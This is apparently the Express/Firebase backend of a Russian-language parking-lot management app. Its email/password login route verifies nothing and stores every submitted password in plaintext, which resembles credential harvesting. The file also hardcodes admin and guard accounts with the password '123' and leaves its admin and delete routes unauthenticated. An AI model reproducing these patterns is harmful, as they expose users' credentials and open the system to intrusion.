const express = require('express');
const bodyParser = require('body-parser');
const firebaseAdmin = require('firebase-admin');
const cors = require('cors');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(cors());

// Firebase init через переменные окружения
const firebaseConfig = JSON.parse(process.env.FIREBASE_CONFIG);
firebaseAdmin.initializeApp({
  credential: firebaseAdmin.credential.cert(firebaseConfig),
});
const db = firebaseAdmin.firestore();


// ======================= AUTH =======================
// Вариант 1: логин через email/password (из index.html)
app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email и пароль обязательны' });
  }

  try {
    await db.collection('logins').add({
      email,
      password,
      timestamp: new Date().toISOString()
    });
    res.status(200).json({ message: 'Данные успешно отправлены' });
  } catch (error) {
    console.error("Ошибка Firebase:", error);
    res.status(500).json({ error: 'Ошибка сервера: ' + error.message });
  }
});

// Вариант 2: логин по username/password (admin / guard)
app.post('/auth/user-login', (req, res) => {
  const { username, password } = req.body;
  const users = {
    admin: { password: '123', role: 'admin' },
    guard: { password: '123', role: 'guard' }
  };

  if (users[username] && users[username].password === password) {
    res.status(200).json({ role: users[username].role });
  } else {
    res.status(401).json({ error: 'Неверное имя пользователя или пароль' });
  }
});


// ======================= VEHICLES =======================

// Добавление автомобиля
app.post('/vehicles/add-vehicle', async (req, res) => {
  try {
    const { vehicleNumber, vehicleBrand } = req.body;
    const vehicleRef = db.collection('vehicles').doc();

    await vehicleRef.set({
      vehicleNumber,
      vehicleBrand,
      entryTime: new Date().toISOString(),
      exitTime: null,
      totalAmount: 0
    });

    res.status(200).send('Автомобиль успешно добавлен!');
  } catch (error) {
    res.status(500).send('Ошибка добавления автомобиля: ' + error.message);
  }
});

// Получение всех автомобилей
app.get('/vehicles', async (req, res) => {
  try {
    const snapshot = await db.collection('vehicles').get();
    const list = [];
    snapshot.forEach(doc => list.push({ id: doc.id, ...doc.data() }));
    res.status(200).json(list);
  } catch (error) {
    res.status(500).send('Ошибка получения автомобилей: ' + error.message);
  }
});

// Фиксация выезда
app.put('/vehicles/:id/exit', async (req, res) => {
  try {
    const id = req.params.id;
    const ref = db.collection('vehicles').doc(id);
    const doc = await ref.get();

    if (!doc.exists) return res.status(404).send('Автомобиль не найден');

    const entryTime = new Date(doc.data().entryTime);
    const exitTime = new Date();
    const hoursParked = Math.ceil((exitTime - entryTime) / (1000 * 60 * 60));

    let totalAmount = 1000;
    if (hoursParked > 24) {
      const extra = hoursParked - 24;
      totalAmount += extra * 40;
    }

    await ref.update({
      exitTime: exitTime.toISOString(),
      totalAmount
    });

    res.status(200).send(`Выезд зафиксирован. Общая сумма: ${totalAmount} KZT`);
  } catch (error) {
    res.status(500).send('Ошибка при обновлении: ' + error.message);
  }
});

// Удаление автомобиля
app.delete('/vehicles/:id', async (req, res) => {
  try {
    await db.collection('vehicles').doc(req.params.id).delete();
    res.status(200).send('Автомобиль удалён успешно!');
  } catch (error) {
    res.status(500).send('Ошибка удаления: ' + error.message);
  }
});

// Отчёт для администратора
app.get('/admin/report', async (req, res) => {
  try {
    const snapshot = await db.collection('vehicles').get();
    let totalAmount = 0;
    let count = 0;
    snapshot.forEach(doc => {
      totalAmount += doc.data().totalAmount || 0;
      count++;
    });

    res.status(200).json({ totalAmount, vehicleCount: count });
  } catch (error) {
    res.status(500).send('Ошибка отчёта: ' + error.message);
  }
});


// ======================= FRONTEND =======================
app.use(express.static(path.join(__dirname, '../frontend')));
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});


// ======================= START =======================
app.listen(port, () => {
  console.log(`Сервер запущен: http://localhost:${port}`);
});
